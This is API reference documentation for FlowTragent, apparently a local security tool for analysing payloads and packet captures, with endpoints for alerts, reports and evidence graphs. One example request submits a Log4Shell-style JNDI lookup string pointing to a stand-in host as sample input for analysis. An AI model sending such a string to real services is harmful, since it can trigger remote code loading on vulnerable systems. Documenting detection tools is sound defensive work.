# FlowTragent API Reference

> Updated: 2026-07-16  
> Scope: Flask Web UI and operational endpoints in `web_app.py`

FlowTragent exposes a small HTTP surface for health checks, metrics, report
browsing, payload/PCAP analysis, alert review, and evidence graph rendering.
The Web UI is form-oriented by design, so most analysis endpoints return HTML
pages or downloadable artifacts rather than a public JSON API.

## Authentication

Set `FLOWTRAGENT_TOKEN` to protect sensitive routes. When the variable is not
set, local development requests are allowed without a token.

Protected endpoints:

```text
GET  /alerts
POST /analyze-payload
POST /analyze-pcap
GET  /reports/<filename>
POST /delete-report/<filename>
GET  /export-reports.zip
GET  /graph-svg/<filename>
```

Token may be supplied as a form field, query parameter, or header depending on
the client workflow:

```text
flowtragent_token=<FLOWTRAGENT_TOKEN>
?token=<FLOWTRAGENT_TOKEN>
X-FlowTragent-Token: <FLOWTRAGENT_TOKEN>
Authorization: Bearer <FLOWTRAGENT_TOKEN>
```

If authentication fails, the server returns `401 text/plain`.

## Health

### `GET /health`

Returns JSON health for the web process dependencies.

Response fields:

| Field | Description |
|------|-------------|
| `status` | `ok` when NOVA index is ready, otherwise `degraded` |
| `components.capture_worker` | Process marker check for `scripts/live_capture_worker.py` |
| `components.analyzer_worker` | Process marker check for `scripts/live_analyzer_worker.py` |
| `components.nova_index` | NOVA index path readiness |
| `paths.report_dir` | Report directory existence and path status |
| `paths.pcap_dir` | PCAP upload directory existence and path status |
| `paths.live_incoming_dir` | Live segment directory status |
| `paths.alert_db` | Alert SQLite database file status |

Example:

```bash
curl http://127.0.0.1:5000/health
```

## Metrics

### `GET /metrics`

Returns Prometheus text exposition format.

Representative metrics:

```text
flowtragent_pcaps_processed_total
flowtragent_alerts_by_severity{severity="high"}
flowtragent_live_segment_queue_size
flowtragent_nova_index_ready
flowtragent_notifications_suppressed_total
```

Example:

```bash
curl http://127.0.0.1:5000/metrics
```

## Analysis

### `POST /analyze-payload`

Runs FlowTragent against a raw payload string and returns the index page with
the generated report path.

Form fields:

| Field | Required | Description |
|------|:--------:|-------------|
| `payload` | yes | Raw HTTP payload, request line, body, or suspicious text |
| `demo_index` | no | Use demo NOVA index when checked |
| `enable_rag` | no | Enable optional RAG context |
| `enable_ollama` | no | Enable scheduled Ollama review |
| `flowtragent_token` | when configured | Authentication token |

Example:

```bash
curl -X POST http://127.0.0.1:5000/analyze-payload \
  -F "payload=GET /?x=\${jndi:ldap://evil.example/a} HTTP/1.1" \
  -F "demo_index=on"
```

### `POST /analyze-pcap`

Uploads a PCAP/PCAPNG file, optionally uploads supplementary logs, runs the
PCAP pipeline, and returns the index page with the generated report path.

Form fields:

| Field | Required | Description |
|------|:--------:|-------------|
| `pcap` | yes | `.pcap`, `.cap`, or `.pcapng` upload with valid PCAP magic |
| `access_log` | no | HTTP/access log enrichment file |
| `dns_log` | no | DNS log enrichment file |
| `endpoint_log` | no | Endpoint/process/file evidence log |
| `app_log` | no | Application log evidence |
| `demo_index` | no | Use demo NOVA index when checked |
| `enable_rag` | no | Enable optional RAG context |
| `enable_ollama` | no | Enable scheduled Ollama review |
| `flowtragent_token` | when configured | Authentication token |

Upload constraints are controlled by `config/config.yaml` under `web`:
`max_upload_mb`, `allowed_pcap_extensions`, and `allowed_log_extensions`.

Example:

```bash
curl -X POST http://127.0.0.1:5000/analyze-pcap \
  -F "pcap=@data/pcap/demo_attack.pcap" \
  -F "access_log=@access.log" \
  -F "demo_index=on"
```

Invalid uploads return `400 text/plain` with the rejection reason.

## Alerts

### `GET /alerts`

Renders the alert review page. Alerts are read from the configured SQLite
alert database, and cross-window attack activities are derived from stored
alerts.

Query parameters:

| Parameter | Default | Description |
|-----------|---------|-------------|
| `limit` | `100` | Maximum number of alerts and activities to render |
| `token` | when configured | Authentication token |

Example:

```bash
curl "http://127.0.0.1:5000/alerts?limit=50"
```

## Reports

### `GET /view-report/<filename>`

Renders an HTML detail page for a Markdown report when the matching JSON report
artifact exists. If the JSON artifact is absent, the server redirects to the
raw report download endpoint.

Query parameters:

| Parameter | Default | Description |
|-----------|---------|-------------|
| `lang` | `en` | Use `zh` for Chinese labels and localized Markdown filename |

### `GET /reports/<filename>`

Serves a report artifact from the configured report directory.

Supported artifacts are generated by the pipeline and typically include:
`.md`, `_zh.md`, `.json`, `.dot`, `_zh.dot`, `.svg`, and `.png`.

Example:

```bash
curl -O http://127.0.0.1:5000/reports/flowtragent_report_example.md
```

### `POST /delete-report/<filename>`

Deletes all artifacts sharing the same report base name:

```text
.md, _zh.md, .json, .dot, _zh.dot, .png, .svg
```

The implementation sanitizes the filename and only deletes files inside the
configured report directory.

### `GET /export-reports.zip`

Downloads a ZIP archive containing generated FlowTragent report artifacts.

Example:

```bash
curl -o flowtragent_reports.zip http://127.0.0.1:5000/export-reports.zip
```

## Evidence Graph

### `GET /graph-svg/<filename>`

Renders the DOT graph embedded in a JSON report as SVG. If Graphviz `dot` is
not installed, the endpoint returns the DOT text as `text/plain`.

Query parameters:

| Parameter | Default | Description |
|-----------|---------|-------------|
| `lang` | `en` | Use `zh` to prefer the Chinese DOT graph key |

Responses:

| Status | Content Type | Meaning |
|:------:|--------------|---------|
| `200` | `image/svg+xml` | Graphviz rendered SVG |
| `200` | `text/plain` | Graphviz missing; raw DOT returned |
| `404` | `text/plain` | JSON report or graph DOT is missing |

Example:

```bash
curl http://127.0.0.1:5000/graph-svg/flowtragent_report_example.json
```

## Operational Notes

- `GET /` is the human Web UI landing/workbench page.
- Analysis endpoints write runtime artifacts under the configured `reports/`
  and PCAP directories; these artifacts must not be committed.
- Sensitive operations are audited through structured JSON Lines logging when
  `observability.structured_logs.enabled` is true.
- The API surface is intended for local or trusted deployment behind a reverse
  proxy. Use HTTPS and an external authentication layer for shared deployments.
